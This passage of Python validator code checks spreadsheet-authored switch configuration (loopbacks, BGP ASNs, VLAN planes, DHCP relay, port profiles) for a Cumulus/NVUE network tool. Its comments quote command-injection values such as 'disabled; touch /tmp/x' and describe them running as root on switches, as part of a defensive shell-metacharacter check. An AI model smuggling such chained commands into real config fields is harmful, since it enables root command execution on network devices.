        kind, vrf = _classify_loopback_header_v(v)
        if kind == 'switch':
            col_switch = c
        elif kind == 'lo':
            col_lo = c
        elif kind == 'asn':
            col_asn = c
        elif kind == 'vrf':
            vrf_cols[vrf] = c
        else:
            result.warn("Loopbacks",
                        f"Unknown column header '{v}' at column {c}; will be ignored. "
                        f"Known: Switch, Default, OOB, INBAND, EXIT, GPU.")

    if col_switch is None:
        result.error("Loopbacks", "Required 'Switch' column not found.")
        return

    # Source of truth: only the Name column from the Nodes tab. Adding
    # n['function'] here used to false-match canonical role strings
    # ('csl', 'core') as if they were hostnames — bug. Hostnames live in
    # the Name column.
    known_switch_names = {(n.get('name') or '').strip() for n in parsed_nodes if n.get('name')}

    # VLAN subnets paired with their VRF — a loopback for VRF X is allowed
    # to live inside a VLAN that's in VRF X (e.g. GPU VRF loopback inside
    # the GPU VLAN subnet — our tool generates this by default).
    vlan_subnets = []  # list of (name, subnet_cidr, vrf)
    for vl in (parsed_vlans or []):
        sub = (vl.get('subnet') or '').strip()
        if sub and '/' in sub:
            vlan_subnets.append((vl.get('name') or vl.get('id') or '?',
                                 sub,
                                 (vl.get('vrf') or '').strip().upper()))

    lb_base = None
    if settings and settings.get('loopback_base'):
        lb_base = f"{str(settings['loopback_base']).strip()}.0/24"

    unique_seen = {vrf: {} for vrf in _LOOPBACK_VRFS}    # ip -> [switches]
    lo_seen = {}                                          # ip -> [switches]
    lb_outside = {}  # divergent_subnet "x.y.z.0/24" -> [(switch, ip)]
    # L13/L15: track switch names seen so duplicate rows (which silently
    # overwrite earlier overrides) are caught.
    switch_rows_seen = {}  # sw_name -> first-row-number
    # L14: track per-switch IPs across VRFs to catch cross-VRF dup IPs.
    per_switch_ips = {}  # sw_name -> {ip: [vrfs]}
    # Per-switch explicit BGP ASN (optional column). Populated below;
    # group-consistency (equal-within / distinct-across) checked after the loop.
    sw_asn = {}          # sw_name -> int ASN (only rows with a valid value)

    for row in range(header_row + 1, ws.max_row + 1):
        sw = ws.cell(row=row, column=col_switch).value
        if not sw or not str(sw).strip():
            continue
        sw_name = str(sw).strip()
        if sw_name in switch_rows_seen:
            result.error("Loopbacks",
                         f"Row {row}: duplicate switch row '{sw_name}' (also on "
                         f"row {switch_rows_seen[sw_name]}). Parser silently uses "
                         f"the LAST row — earlier overrides (lo and other VRFs) "
                         f"get wiped out, even if the later row only populates "
                         f"some columns.")
            continue
        switch_rows_seen[sw_name] = row
        if known_switch_names and sw_name not in known_switch_names:
            # Upgraded from warn → error: a Loopbacks override against a
            # hostname that isn't on the Nodes tab does nothing at parse
            # time and is almost always a typo. Catch it before generate.
            result.error("Loopbacks",
                         f"Row {row}: switch '{sw_name}' is not listed in the Nodes tab. "
                         f"Add it to Nodes, or fix the hostname here.")

        if col_asn is not None:
            av = ws.cell(row=row, column=col_asn).value
            if av is not None and str(av).strip():
                # Reject floats with a fraction outright (silent truncation).
                if isinstance(av, float) and not av.is_integer():
                    result.error("Loopbacks",
                                 f"Row {row}, column 'ASN': '{av}' must be an "
                                 f"integer (fractional value hides a typo).")
                else:
                    try:
                        asn_i = int(av)
                        if asn_i < 1:
                            result.error("Loopbacks",
                                         f"Row {row}, column 'ASN': {asn_i} must be positive.")
                        elif asn_i > 0xFFFFFFFF:
                            result.error("Loopbacks",
                                         f"Row {row}, column 'ASN': {asn_i} exceeds "
                                         f"2^32-1 ({0xFFFFFFFF}); 4-byte ASN max.")
                        elif asn_i == 23456:
                            result.error("Loopbacks",
                                         f"Row {row}, column 'ASN': 23456 is reserved "
                                         f"(RFC 4893 4-byte transition). Choose another.")
                        else:
                            sw_asn[sw_name] = asn_i
                    except (TypeError, ValueError):
                        result.error("Loopbacks",
                                     f"Row {row}, column 'ASN': '{av}' is not an integer.")

        if col_lo is not None:
            v = ws.cell(row=row, column=col_lo).value
            if v is not None and str(v).strip():
                val = str(v).strip()
                ip = val.split('/')[0]
                # L05/L06: validate prefix length when supplied
                prefix_part = val.split('/', 1)[1] if '/' in val else None
                if prefix_part is not None:
                    try:
                        p = int(prefix_part)
                        if p < 1 or p > 32:
                            result.error("Loopbacks",
                                         f"Row {row}, column 'Default': prefix /{p} "
                                         f"out of range (must be 1-32; /32 standard "
                                         f"for loopback IPs).")
                    except ValueError:
                        result.error("Loopbacks",
                                     f"Row {row}, column 'Default': prefix "
                                     f"'{prefix_part}' is not an integer.")
                if not _is_valid_ip(ip):
                    result.error("Loopbacks",
                                 f"Row {row}, column 'Default': '{val}' is not a valid IPv4 address.")
                elif ip in ('0.0.0.0', '255.255.255.255') or ip.startswith('127.'):
                    # Reserved / loopback-class addresses produce broken NVUE
                    result.error("Loopbacks",
                                 f"Row {row}, column 'Default': '{val}' is a "
                                 f"reserved address (0.0.0.0, 127.x.y.z, or "
                                 f"broadcast) and produces broken NVUE config.")
                else:
                    lo_seen.setdefault(ip, []).append(sw_name)
                    per_switch_ips.setdefault(sw_name, {}).setdefault(ip, []).append('Default')
                    for vl_name, vl_sub, _vl_vrf in vlan_subnets:
                        if _subnet_contains(vl_sub, ip):
                            result.error("Loopbacks",
                                         f"Row {row}: '{sw_name}' Default={val} falls inside VLAN "
                                         f"'{vl_name}' subnet {vl_sub}.")
                    if lb_base and not _subnet_contains(lb_base, ip):
                        octets = ip.split('.')
                        sub24 = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
                        lb_outside.setdefault(sub24, []).append((sw_name, val))

        for vrf, col in vrf_cols.items():
            v = ws.cell(row=row, column=col).value
            if v is None or not str(v).strip():
                continue
            val = str(v).strip()
            ip = val.split('/')[0]
            # L05/L06 (per-VRF column): validate prefix length when supplied
            prefix_part = val.split('/', 1)[1] if '/' in val else None
            if prefix_part is not None:
                try:
                    p = int(prefix_part)
                    if p < 1 or p > 32:
                        result.error("Loopbacks",
                                     f"Row {row}, column '{vrf}': prefix /{p} "
                                     f"out of range (must be 1-32).")
                except ValueError:
                    result.error("Loopbacks",
                                 f"Row {row}, column '{vrf}': prefix "
                                 f"'{prefix_part}' is not an integer.")
            if not _is_valid_ip(ip):
                result.error("Loopbacks",
                             f"Row {row}, column '{vrf}': '{val}' is not a valid IPv4 address.")
                continue
            unique_seen[vrf].setdefault(ip, []).append(sw_name)
            per_switch_ips.setdefault(sw_name, {}).setdefault(ip, []).append(vrf)
            for vl_name, vl_sub, vl_vrf in vlan_subnets:
                if _subnet_contains(vl_sub, ip) and vrf != vl_vrf:
                    result.error("Loopbacks",
                                 f"Row {row}: '{sw_name}' {vrf}={val} falls inside VLAN "
                                 f"'{vl_name}' subnet {vl_sub} (VRF {vl_vrf or '?'}). Loopback "
                                 f"IPs must not overlap subnets owned by a different VRF.")

    for ip, owners in lo_seen.items():
        if len(owners) > 1:
            result.error("Loopbacks",
                         f"Default loopback {ip} is assigned to multiple switches: "
                         f"{', '.join(owners)}.")

    for vrf, seen in unique_seen.items():
        for ip, owners in seen.items():
            if len(owners) > 1:
                result.error("Loopbacks",
                             f"{vrf} loopback {ip} is assigned to multiple switches: "
                             f"{', '.join(owners)}.")

    # Block conformance for E/W plane loopbacks. The duplicate checks above
    # only fire once two switches already share an IP; this catches the scale
    # *before* that, when a value merely sits in the wrong block. A plane that
    # pinned its gs spines at .5/.6 read as unique but was one added leaf away
    # from a collision, because .5 belongs to the leaf range. Warn rather than
    # error — the role is inferred from the hostname, and a deployment may
    # legitimately run its own address plan.
    _PLANE_SWITCH_RE = re.compile(r'^(gl|gsl|gs)-plane(\d+)-(\d+)$', re.IGNORECASE)
    _PLANE_BLOCK = {
        ('leaf', 'Default'):  'leaf',
        ('leaf', 'GPU'):      'leaf_gpu',
        ('spine', 'Default'): 'spine',
        ('spine', 'GPU'):     'spine_gpu',
    }
    for column, seen in (('Default', lo_seen), ('GPU', unique_seen.get('GPU', {}))):
        for ip, owners in sorted(seen.items()):
            for sw_name in owners:
                m = _PLANE_SWITCH_RE.match(str(sw_name).strip())
                if not m:
                    continue
                role = 'spine' if m.group(1).lower() == 'gs' else 'leaf'
                base, capacity = PLANE_LOOPBACK_BLOCKS[_PLANE_BLOCK[(role, column)]]
                index = int(m.group(3))
                try:
                    octet = int(str(ip).rsplit('.', 1)[1])
                except (IndexError, ValueError):
                    continue
                if index > capacity:
                    result.warn("Loopbacks",
                                f"'{sw_name}' index {index} exceeds the {role} loopback "
                                f"block capacity ({capacity}); the plane has outgrown its "
                                f"block.")
                elif octet != base + index:
                    result.warn("Loopbacks",
                                f"'{sw_name}' {column}={ip} is outside the {role} "
                                f"{column} loopback block (expected final octet "
                                f"{base + index}, range .{base + 1}-.{base + capacity}). "
                                f"Out-of-block values collide as the plane grows — see "
                                f"docs/LOOPBACKS.md.")

    # R4-15: suppress the "outside loopback_base" warning when every
    # affected switch matches a dual-plane hostname pattern (gsl-planeN-* or
    # csl-*). Those are the architectures that intentionally place
    # loopbacks outside the global loopback_base.
    _DUAL_PLANE_RE = re.compile(r'^(gsl-plane[12]|csl)-', re.IGNORECASE)
    for sub24, entries in lb_outside.items():
        sw_list = ', '.join(sw for sw, _ in entries)
        if all(_DUAL_PLANE_RE.match(sw) for sw, _ in entries):
            continue  # intentional dual-plane offset; not worth warning
        result.warn("Loopbacks",
                    f"{len(entries)} switch(es) have Default loopbacks in {sub24}, outside "
                    f"Settings.loopback_base subnet {lb_base}: {sw_list}. (Expected for "
                    f"dual-plane archs; ignore if intentional.)")

    # L14: cross-VRF dup IP on same switch. The same IP used in OOB and
    # INBAND columns on one row would be silently accepted today —
    # operator likely meant to use different IPs but copy-pasted.
    for sw_name, ip_to_vrfs in per_switch_ips.items():
        for ip, vrfs in ip_to_vrfs.items():
            if len(vrfs) > 1:
                result.error("Loopbacks",
                             f"Switch '{sw_name}': IP {ip} used in multiple "
                             f"columns ({', '.join(vrfs)}). Each loopback per "
                             f"switch must be unique across columns — duplicates "
                             f"silently collide at apply time.")

    # BGP ASN group-consistency. All sessions are unnumbered
    # (remote-as internal ⟹ equal, external ⟹ differ), so overrides must keep
    # shared groups uniform (equal-within) and every group distinct
    # (distinct-across). Only runs when the optional ASN column is populated.
    if col_asn is not None and sw_asn:
        ns_tiers = int((settings or {}).get('ns_tiers',
                                            (settings or {}).get('tiers', 1)) or 1)
        all_switch_names = [n.get('name') for n in (parsed_nodes or []) if n.get('name')]
        claimed = {}  # asn_value -> the group (list of names) that first claimed it
        for grp in asn_alloc.partition_asn_groups(all_switch_names, ns_tiers):
            explicit = {name: sw_asn[name] for name in grp if name in sw_asn}
            if not explicit:
                continue
            distinct_vals = set(explicit.values())
            if len(grp) > 1 and len(distinct_vals) > 1:
                detail = ', '.join(f"{n}={a}" for n, a in sorted(explicit.items()))
                result.error("Loopbacks",
                             f"Switches {sorted(grp)} must share ONE BGP ASN "
                             f"(iBGP / shared plane), but the ASN column splits them: "
                             f"{detail}. Give every member the same ASN, or none.")
                continue  # a split group can't meaningfully take part in distinct-across
            if len(grp) > 1 and len(explicit) < len(grp):
                missing = sorted(set(grp) - set(explicit))
                result.warn("Loopbacks",
                            f"Switches {sorted(grp)} share one ASN, but only "
                            f"{sorted(explicit)} set it explicitly; {missing} fall back "
                            f"to the derived value. Set all or none to avoid a split.")
            grp_asn = next(iter(distinct_vals))
            if grp_asn in claimed and claimed[grp_asn] != grp:
                result.error("Loopbacks",
                             f"BGP ASN {grp_asn} is used by two distinct switch groups: "
                             f"{sorted(claimed[grp_asn])} and {sorted(grp)}. eBGP peers "
                             f"must have distinct ASNs — give each group a unique ASN.")
            else:
                claimed[grp_asn] = grp


def validate_tiers_consistency(settings, roles_present):
    """ns_tiers/ew_tiers must match the spine roles actually declared.

    settings: dict of Settings values. roles_present: set of canonical role
    strings present among switches. Falls back to a legacy single `tiers`.
    Returns a list of error strings (empty = consistent).
    """
    errs = []
    ns = int(settings.get("ns_tiers", settings.get("tiers", 1)) or 1)
    ew = int(settings.get("ew_tiers", settings.get("tiers", 1)) or 1)
    has_cs = "cs" in roles_present
    has_gs = bool({"gs-plane1", "gs-plane2"} & set(roles_present))
    if ns == 2 and not has_cs:
        errs.append("ns_tiers=2 but no compute spine (cs) is declared")
    if ns == 1 and has_cs:
        errs.append("ns_tiers=1 but a compute spine (cs) is declared")
    if ew == 2 and not has_gs:
        errs.append("ew_tiers=2 but no GPU spine (gs) is declared")
    if ew == 1 and has_gs:
        errs.append("ew_tiers=1 but a GPU spine (gs) is declared")
    return errs


def validate_plane_consistency(wb, parsed_vlans, result):
    """Verify Wire Map plane references match gpu_plane<N> VLAN rows.

    Three checks:
      1. Wire Map references a plane the VLANs sheet doesn't define -> error.
      2. VLANs defines a plane the Wire Map doesn't use -> warn.
      3. NIC count on a plane exceeds the plane's subnet capacity -> error.
    """
    planes_in_wm, nic_count = _planes_referenced_in_wire_map(wb)

    planes_in_vlans = {}
    rail_vlans = {}
    rail_plane_vlans = {}
    for v in parsed_vlans:
        name = v.get('name') or ''
        m = _PLANE_VLAN_NAME_RE.match(name)
        if m:
            planes_in_vlans[f'plane{m.group(1)}'] = v
            continue
        # Single-plane per-rail mode: gpu_rail<R> rows replace the aggregate
        # gpu_plane1 VLAN row, but still satisfy plane1 switch references.
        m_r = _RAIL_VLAN_NAME_RE.match(name)
        if m_r:
            rail_vlans[int(m_r.group(1))] = v
            continue
        # Per-rail-per-plane mode: gpu_rail<R>_plane<P> rows also satisfy
        # the plane reference (the operator is using the new naming).
        m_rp = _RAIL_PLANE_VLAN_NAME_RE.match(name)
        if m_rp:
            rail = int(m_rp.group(1))
            plane = f'plane{int(m_rp.group(2))}'
            rail_plane_vlans[(plane, rail)] = v
            planes_in_vlans.setdefault(plane, v)

    if planes_in_wm == {'plane1'} and rail_vlans:
        planes_in_vlans.setdefault('plane1', next(iter(rail_vlans.values())))

    if not planes_in_wm and not planes_in_vlans:
        return  # single-plane arch, nothing to check

    missing = planes_in_wm - set(planes_in_vlans)
    for plane in sorted(missing):
        result.error("Plane consistency",
                     f"Wire Map references {plane} switches but VLANs & Profiles "
                     f"has no 'gpu_{plane}' row. Add a VLAN row named "
                     f"'gpu_{plane}' with the plane's subnet.")

    orphan = set(planes_in_vlans) - planes_in_wm
    for plane in sorted(orphan):
        result.warn("Plane consistency",
                    f"VLANs & Profiles defines 'gpu_{plane}' but no Wire Map "
                    f"switch hostname contains '-{plane}-'.")

    if rail_plane_vlans:
        rail_plane_count = _rail_planes_referenced_in_wire_map(wb)
        for (plane, rail), needed in sorted(rail_plane_count.items()):
            vlan = rail_plane_vlans.get((plane, rail))
            if vlan is None:
                result.error("Plane consistency",
                             f"Wire Map references GPU Rail {rail} {plane} "
                             f"but VLANs & Profiles has no "
                             f"'gpu_rail{rail}_{plane}' row.")
                continue
            if not vlan.get('network'):
                continue
            capacity = vlan['network'].num_addresses - 2
            if needed > capacity:
                result.error("Plane consistency",
                             f"GPU Rail {rail} {plane} subnet {vlan['network']} "
                             f"has {capacity} usable IPs but Wire Map needs {needed}.")
        return

    if rail_vlans and planes_in_wm <= {'plane1'}:
        rail_count = _rails_referenced_in_wire_map(wb)
        for rail, needed in sorted(rail_count.items()):
            vlan = rail_vlans.get(rail)
            if vlan is None:
                result.error("Plane consistency",
                             f"Wire Map references GPU Rail {rail} but VLANs & "
                             f"Profiles has no 'gpu_rail{rail}' row.")
                continue
            if not vlan.get('network'):
                continue
            capacity = vlan['network'].num_addresses - 2
            if needed > capacity:
                result.error("Plane consistency",
                             f"GPU Rail {rail} subnet {vlan['network']} has "
                             f"{capacity} usable IPs but Wire Map needs {needed}.")
        return

    for plane, vlan in planes_in_vlans.items():
        if not vlan.get('network'):
            continue
        capacity = vlan['network'].num_addresses - 2
        needed = nic_count.get(plane, 0)
        if needed > capacity:
            result.error("Plane consistency",
                         f"{plane} subnet {vlan['network']} has {capacity} usable "
                         f"IPs but Wire Map needs {needed}.")


def validate_cross_sheet_ports(wm_ports, air_ports, result):
    """Check for port conflicts between Wire Map and Air_Only sheets."""
    for key in air_ports:
        if key in wm_ports:
            sw_role, sw_port = key
            wm_detail = "; ".join(f"row {r} ({sys})" for r, sys in wm_ports[key])
            air_detail = "; ".join(f"row {r} ({sys})" for r, sys in air_ports[key])
            result.warn("Cross-sheet", f"Port {sw_role} {sw_port} defined in both Wire Map ({wm_detail}) and Air_Only ({air_detail}) — Air_Only takes priority")


_INTERFACE_NAME_PATTERN = re.compile(
    r'^(?:'
    r'swp\d+(?:s\d+)?'      # swpN or swpNsM
    r'|vlan\d+(?:_l3)?'     # vlanN or vlanN_l3
    r'|bond\d+'             # bondN
    r')$'
)


def _is_valid_interface_name(name):
    """True if name is a syntactically valid Cumulus L3 interface."""
    return bool(_INTERFACE_NAME_PATTERN.match(name))


# VRFs that may host a DHCP server (= where the relay daemon runs).
# Extend with STORAGE if/when that VRF is split out.
_VALID_RELAY_DAEMON_VRFS = {'OOB', 'EXIT', 'INBAND'}

# VRFs that may NOT have client VLANs (VLAN row's own VRF restrictions).
# GPU: per ERA architecture principles, GPU traffic does not transit
#      a DHCP relay path.
# EXIT: transit/server VRF, not a client VRF.
# default: BGP underlay, no service hosts.
_FORBIDDEN_CLIENT_VRFS = {'GPU', 'EXIT', 'DEFAULT', ''}


def _build_vlan_id_set(parsed_vlans):
    """Return set of integer VLAN IDs from parsed VLAN rows (for
    cross-checking upstream-interface vlanNNN references)."""
    ids = set()
    for v in parsed_vlans:
        try:
            ids.add(int(v.get('id') or 0))
        except (TypeError, ValueError):
            pass
    return ids


def validate_dhcp_relay(ws, parsed_vlans, result):
    """Validate the DHCP Relay table on the VLANs & Profiles sheet
    and the per-VLAN 'DHCP Relay Client' column.

    Rules:
      1. DHCP Relay table: one row per VRF, valid IPv4 servers, allowed
         VRFs only, Upstream Interface required + syntactically valid.
      2. VLANs with DHCP Relay Client != No/blank must:
         - not live in a forbidden client VRF (GPU/EXIT/default)
         - reference a VRF that has a row in the DHCP Relay table
    """
    # --- Parse the DHCP Relay table ---
    table = []
    header_row = None
    for row in range(1, ws.max_row + 1):
        val = _cell(ws, row, 1)
        if val and str(val).strip() == 'DHCP Relay':
            header_row = row
            break

    if header_row is not None:
        # Don't terminate on first blank — operators sometimes leave a
        # blank row between entries. Walk to end of sheet (or until a
        # named section), and treat blank+populated patterns carefully:
        # if ANY of cols 1-3 are populated, treat as a (possibly partial)
        # data row and validate it.
        consecutive_blanks = 0
        for row in range(header_row + 2, ws.max_row + 1):
            ip_cell = _cell(ws, row, 1)
            vrf_cell = _cell(ws, row, 2)
            up_cell = _cell(ws, row, 3)

            ip_str = str(ip_cell).strip() if ip_cell else ''
            vrf_str = str(vrf_cell or '').strip()
            up_str = str(up_cell or '').strip()

            # End of section: next named section marker in col 1
            if ip_str in ('VRFs', 'Port Profiles', 'VLANs'):
                break

            # Truly empty row (all 3 cells blank) — count, terminate
            # after enough consecutive blanks to feel confident it's the
            # end of the table rather than an operator gap.
            if not ip_str and not vrf_str and not up_str:
                consecutive_blanks += 1
                if consecutive_blanks >= 3:
                    break
                continue
            consecutive_blanks = 0

            # At least one cell populated → treat as a data row.
            table.append({
                'row': row,
                'server_ip_raw': ip_str,
                'vrf': vrf_str.upper(),
                'upstream_interface': up_str,
            })

    # --- Validate table rows ---
    seen_vrfs = set()
    relay_vrfs = set()
    for entry in table:
        row = entry['row']
        vrf = entry['vrf']
        upstream = entry['upstream_interface']

        # VRF presence & allowed values
        if not vrf:
            result.error("VLANs & Profiles",
                         f"DHCP Relay table row {row}: VRF is required.")
            continue
        if vrf not in _VALID_RELAY_DAEMON_VRFS:
            result.error("VLANs & Profiles",
                         f"DHCP Relay table row {row}: VRF '{vrf}' not allowed "
                         f"as a relay daemon VRF. Allowed: {sorted(_VALID_RELAY_DAEMON_VRFS)}.")
            continue

        # Duplicate VRF rows
        if vrf in seen_vrfs:
            result.error("VLANs & Profiles",
                         f"DHCP Relay table row {row}: duplicate VRF '{vrf}'. "
                         f"One row per VRF; combine servers into a comma-list "
                         f"in the Server IP column.")
            continue
        seen_vrfs.add(vrf)
        relay_vrfs.add(vrf)

        # Server IPs valid IPv4
        servers = [s.strip() for s in entry['server_ip_raw'].split(',') if s.strip()]
        if not servers:
            result.error("VLANs & Profiles",
                         f"DHCP Relay table row {row}: Server IP is required "
                         f"(comma-separated for multiple servers).")
        for ip in servers:
            if not _is_valid_ip(ip):
                result.error("VLANs & Profiles",
                             f"DHCP Relay table row {row}: '{ip}' is not a "
                             f"valid IPv4 address.")

        # Upstream Interface required + syntactically valid.
        # Comma-list permitted: NVUE supports multiple upstream-interface
        # entries per server-group (per the deck, slide 16).
        # Build the set of declared VLAN IDs once for cross-checking
        # upstream-interface `vlanNNN[_l3]` references against the actual
        # VLAN rows. Catches typos like `vlan99999`.
        declared_vlan_ids = _build_vlan_id_set(parsed_vlans)

        if not upstream:
            result.error("VLANs & Profiles",
                         f"DHCP Relay table row {row}: Upstream Interface is "
                         f"required (e.g., vlan200, vlan3004_l3, swp61s0, bond1; "
                         f"comma-separate for multiple).")
        else:
            upstream_list = [u.strip() for u in upstream.split(',') if u.strip()]
            for iface in upstream_list:
                if not _is_valid_interface_name(iface):
                    result.error("VLANs & Profiles",
                                 f"DHCP Relay table row {row}: '{iface}' is not "
                                 f"a valid Cumulus interface name. Expected "
                                 f"swpN[sM], vlanN[_l3], or bondN.")
                    continue
                # Cross-check `vlanNNN` and `vlanNNN_l3` references
                # against actual VLAN rows. `_l3` stub SVIs derive from
                # the VRF section (parser builds them at vlan{vrf_vlan}_l3)
                # so we accept anything matching a declared VLAN's L3 sub-
                # SVI naming. For non-_l3 form, must match a declared VLAN.
                m_vlan = re.match(r'^vlan(\d+)(_l3)?$', iface, re.IGNORECASE)
                if m_vlan:
                    vid = int(m_vlan.group(1))
                    is_l3_stub = bool(m_vlan.group(2))
                    if not is_l3_stub and vid not in declared_vlan_ids:
                        result.error("VLANs & Profiles",
                                     f"DHCP Relay table row {row}: Upstream "
                                     f"interface '{iface}' references VLAN {vid} "
                                     f"which is not defined in the VLANs section.")
                # `swp` port-bound check (>= 65 already caught in Wire Map
                # validator, but the DHCP relay table doesn't go through
                # that path — re-check here for safety).
                m_swp = re.match(r'^swp(\d+)', iface, re.IGNORECASE)
                if m_swp and int(m_swp.group(1)) > 64:
                    result.error("VLANs & Profiles",
                                 f"DHCP Relay table row {row}: Upstream "
                                 f"interface '{iface}' has port number > 64 "
                                 f"(no Cumulus model in this lineup exceeds 64 "
                                 f"base ports). Likely a typo.")

    # --- Validate per-VLAN DHCP Relay Client values ---
    for v in parsed_vlans:
        client = v.get('dhcp_relay_client', '').strip()
        if not client or client.lower() == 'no':
            continue

        vlan_vrf = (v.get('vrf') or '').strip().upper()
        if vlan_vrf in _FORBIDDEN_CLIENT_VRFS:
            result.error("VLANs & Profiles",
                         f"VLAN {v['id']} '{v['name']}' (row {v['row']}) is in "
                         f"{vlan_vrf or 'unset'} VRF and cannot have DHCP Relay "
                         f"Client set ('{client}'). Set DHCP Relay Client = No.")
            continue

        targets = [c.strip().upper() for c in client.split(',') if c.strip()]
        for target in targets:
            if target.lower() == 'no':
                continue
            # Catch forbidden client targets up front (better message than
            # the generic "no row exists" downstream)
            if target in {'DEFAULT', 'GPU'}:
                result.error("VLANs & Profiles",
                             f"VLAN {v['id']} '{v['name']}' (row {v['row']}): "
                             f"DHCP Relay Client = '{target}' is not allowed. "
                             f"'{target}' is reserved (default = BGP underlay, "
                             f"GPU = isolated by ERA architecture principles). "
                             f"Allowed values: OOB, EXIT, INBAND.")
                continue
            if target not in relay_vrfs:
                result.error("VLANs & Profiles",
                             f"VLAN {v['id']} '{v['name']}' (row {v['row']}): "
                             f"DHCP Relay Client = '{target}' but no DHCP Relay "
                             f"table row exists for VRF '{target}'. Add a row "
                             f"to the DHCP Relay table or set DHCP Relay Client = No.")
                continue
            # Inter-VRF relay is the documented design intent (ERA Network
            # Architecture Principals deck): clients in INBAND obtain leases
            # from a server reachable via OOB or EXIT. The daemon for `target`
            # routes to the client subnet via the cores' VRF route-leak
            # (`route-import from-vrf list <client_vrf>` is emitted by the
            # core template for OOB and EXIT). No client-vs-target VRF
            # mismatch check here.

    # R3-22: warn on DHCP Relay table rows that have zero client VLANs.
    # Operator configured a server-group but no VLAN opts into it — the
    # relay daemon won't get any downstream traffic. Likely the operator
    # forgot the per-VLAN `DHCP Relay Client` column.
    vrfs_with_clients = set()
    for v in parsed_vlans:
        client = v.get('dhcp_relay_client', '').strip()
        if not client or client.lower() == 'no':
            continue
        for target in [c.strip().upper() for c in client.split(',') if c.strip()]:
            vrfs_with_clients.add(target)
    for vrf in relay_vrfs:
        if vrf not in vrfs_with_clients:
            result.warn("VLANs & Profiles",
                        f"DHCP Relay table has a row for VRF '{vrf}' but no "
                        f"VLAN row has DHCP Relay Client set to '{vrf}'. The "
                        f"server-group will be emitted with no downstream "
                        f"interfaces — relay daemon will get no traffic. "
                        f"Set DHCP Relay Client on at least one VLAN row, "
                        f"or remove the unused DHCP Relay table entry.")


# Regexes used by Network Profile validation. Profiles matching these
# names are auto-resolved by the parser (regardless of whether they
# appear in Port Profiles), so they shouldn't be flagged.
_GPU_RAIL_PLANE_PROFILE_RE = re.compile(
    r'^gpu[\s_-]*rail[\s_-]*\d+([\s_-]*plane[\s_-]*\d+)?$', re.IGNORECASE)
_GPU_PLANE_PROFILE_RE = re.compile(
    r'^gpu[\s_-]*plane[\s_-]*\d+$', re.IGNORECASE)
# Air-prefix must have non-empty content after the dash. `'Air -'` alone
# is accepted by the old regex but the parser silently drops the row
# (no specific Air-injection logic to handle it).
_AIR_PREFIX_RE = re.compile(r'^air\s*-\s*\S', re.IGNORECASE)

# Per-rail GPU Wire Map profiles, e.g. "GPU Rail 3 Plane 1" / "GPU Rail 3".
# These resolve to a VLAN row rather than a Port Profiles row, so anything that
# needs their electrical shape has to fall back to the GPU port profile.
_GPU_RAIL_PROFILE_RE = re.compile(
    r'^gpu\s*rail\s*\d+(?:\s*plane\s*\d+)?$', re.IGNORECASE)
_GPU_PROFILE_NAME = 'GPU Network'

# Known disable markers that the topology generator + parser actually
# recognize. Substring matching on 'disabled' is too loose — it accepts
# `'Air - Disabled Test'` and `'disabled-port'` which the parser would
# either silently drop or emit as a live cable, contradicting operator
# intent. Use exact-match (case-insensitive) against this allow-list.
_DISABLE_MARKER_VALUES = {
    'disabled',
    'unused',
    'port disabled by neighbor',
}


_VALID_PORT_MODES = {'access', 'trunk', 'hybrid', 'l2', 'l3'}

# (breakout, lanes) pairs the core/csl/cl config template can actually render.
#
# roles/core/templates/core_nvue_cli.j2 buckets ports into exactly three
# groups -- 4x/2-lane, 2x/4-lane, 8x/1-lane -- with NO else branch. A port
# carrying any other pair is silently dropped from the breakout section, but
# its sub-ports (swpNs0, swpNs1, ...) are still emitted into `type swp`, the
# bonds and the BGP neighbors, because those lists come from the Wire Map
# independently. The result is a config referencing sub-ports that were never
# created -- it generates and validates fine, then fails at `nv config apply`
# on the switch.
#
# This was unreachable while breakout/lanes were hardcoded constants in
# excel_parser. Making the Port Profiles sheet authoritative turned it into a
# live operator-reachable path, so it needs a gate here.
#
# All three pairs multiply to 8, which is the lane budget of one SN5600/SN5610
# cage. breakout == 1 means "use the whole port", needs no breakout line, and
# is therefore always fine (the SN2201 oob_uplink profile is 1x100G).
_RENDERABLE_BREAKOUT_LANES = {(2, 4), (4, 2), (8, 1)}


# Port Profiles columns whose value is rendered UNQUOTED into a root-executed
# switch config. SHELL_INJECTION_PRONE_KEYS guards the Settings sheet only, so
# these need their own check: a `Speed` or `Auto-Negotiate` cell reading
# `disabled; touch /tmp/x` renders as
# `nv set interface ... link auto-negotiate disabled; touch /tmp/x`
# and runs as root on every switch carrying that profile. The parser also
# whitelists both values, so this is defence in depth — but the operator should
# be told at validate time rather than silently losing their input.
# Every Excel-authored cell whose value is rendered UNQUOTED into a
# root-executed switch config. SHELL_INJECTION_PRONE_KEYS guards the Settings
# sheet only; these are the other operator-supplied surfaces that reach a
# template verbatim.
#
# Verified vectors before this check existed: a VRF Name of
# `OOB; touch /tmp/x` reached vrf_vnis and rendered as `nv set vrf OOB; touch
# /tmp/x ...`, and a Port Profiles Auto-Negotiate cell of `disabled; touch
# /tmp/x` rendered as `nv set interface ... link auto-negotiate disabled;
# touch /tmp/x`. Both execute as root on every switch that gets the config.
#
# Entries are (sheet, section-header-in-column-1 or None, {column: label}).
# A section entry scans from its header row until column 1 goes blank; a None
# section scans the whole sheet from row 2.
_UNQUOTED_EXCEL_CELLS = (
    ("VLANs & Profiles", "VRF Name", {1: "VRF Name"}),
    ("VLANs & Profiles", "VLAN ID", {2: "VLAN Name"}),
    ("VLANs & Profiles", "Profile", {6: "VRF", 8: "Speed", 11: "Auto-Negotiate"}),
    ("Prefix lists", None, {1: "List name", 3: "Match", 4: "Max prefix length",
                            5: "Action"}),
    ("Route policy", None, {1: "Route-map", 2: "Rule", 3: "Action",
                            4: "Match type", 5: "Match value", 6: "Set type",
                            7: "Set value"}),
    ("Community lists", None, {1: "Community-list", 2: "Rule", 3: "Action",
                               4: "Community"}),
    ("ACLs", None, {1: "ACL name", 3: "Protocol", 4: "Dest port", 5: "Action"}),
)


def _check_unquoted_cell(sheet, row_label, label, raw, result):
    if raw in (None, ''):
        return
    text = str(raw).strip()
    if not text:
        return
    if len(text) > _MAX_SETTINGS_SCALAR_LEN:
        result.error(sheet,
                     f"{row_label}: {len(text)}-character {label} value exceeds the "
                     f"{_MAX_SETTINGS_SCALAR_LEN}-char limit. This renders into a "
                     f"root-executed switch config.")
        return
    m = _SHELL_META_RE.search(text)
    if m:
        result.error(sheet,
                     f"{row_label}: {label} value {text!r} contains the disallowed "
                     f"character {m.group()!r}. This value is rendered unquoted into "
                     f"a root-executed config script, so shell metacharacters and "
                     f"control characters are rejected to prevent command injection.")


